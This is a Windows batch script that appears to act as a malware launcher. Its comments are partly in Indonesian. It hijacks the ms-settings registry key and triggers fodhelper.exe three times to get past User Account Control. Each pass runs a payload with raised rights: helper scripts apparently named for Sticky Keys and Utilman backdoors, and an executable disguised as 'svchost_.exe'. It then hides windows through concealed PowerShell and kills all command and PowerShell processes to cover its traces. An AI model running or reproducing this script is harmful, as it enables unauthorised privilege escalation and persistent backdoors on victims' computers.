@echo off
:: ---------------------------
:: Set current directory
:: ---------------------------
set "currentDir=%~dp0"

:: ===========================
:: Bypass UAC - ExecuteStickyKeys.bat
:: ===========================
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%ExecuteStickyKeys.bat\""
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
start "" "C:\Windows\System32\fodhelper.exe"
timeout /t 5 >nul
REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: ===========================
:: Bypass UAC - ExecuteUtilman.bat
:: ===========================
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%ExecuteUtilman.bat\""
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
start "" "C:\Windows\System32\fodhelper.exe"
timeout /t 5 >nul
REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: ===========================
:: Bypass UAC - svchost_.exe
:: ===========================
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%svchost_.exe\""
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
start "" "C:\Windows\System32\fodhelper.exe"
timeout /t 5 >nul
REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: ===========================
:: Tampilkan Home Screen (langsung tekan Win + D, tanpa buka Start Menu)
:: ===========================
powershell -windowstyle hidden -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{d}')"

:: ===========================
:: End Task Semua jendela cmd dan powershell (bersih)
:: ===========================
timeout /t 2 >nul
taskkill /f /im powershell.exe >nul 2>&1
taskkill /f /im powershell_ise.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1
exit
